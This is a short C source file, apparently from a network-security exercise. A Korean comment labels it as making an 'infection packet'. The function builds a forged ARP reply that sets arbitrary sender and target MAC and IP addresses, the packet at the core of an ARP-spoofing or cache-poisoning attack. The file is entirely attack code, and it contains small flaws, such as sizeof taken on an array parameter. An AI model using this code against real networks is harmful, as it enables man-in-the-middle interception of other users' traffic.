#include "makeInfPacket.h"

//
// 감염패킷 만들기
//
void makeInfPacket(UCHAR packet[], const u_int8_t sa[], const u_int8_t ta[], const int si[], const int ti[])
{
	ETH_HDR *EH = (ETH_HDR *)packet;
	ARP_HDR *AH = (ARP_HDR *)(packet + 14);
	
	memset(packet, 0, sizeof(packet));

	for (int i = 0; i < ETHER_ADDR_LEN; i++)
	{
		EH->ether_shost[i] = sa[i];
		EH->ether_dhost[i] = ta[i];
	}
	EH->ether_type = ntohs(ETHERTYPE_ARP);

	memcpy(packet, EH, sizeof(ETH_HDR));

	AH->ar_hrd = ntohs(1);
	AH->ar_pro = ntohs(IPHEADER);
	AH->ar_hln = ETHER_ADDR_LEN;
	AH->ar_pln = IPv4_ADDR_LEN;
	AH->ar_op = ntohs(ARPOP_REPLY);
	for (int i = 0; i < ETHER_ADDR_LEN; i++)
	{
		AH->ar_sa[i] = sa[i];
		AH->ar_ta[i] = ta[i];
	}
	for (int i = 0; i < IPv4_ADDR_LEN; i++)
	{
		AH->ar_si[i] = si[i];
		AH->ar_ti[i] = ti[i];
	}

	memcpy(packet + sizeof(ETH_HDR), AH, sizeof(ARP_HDR));

}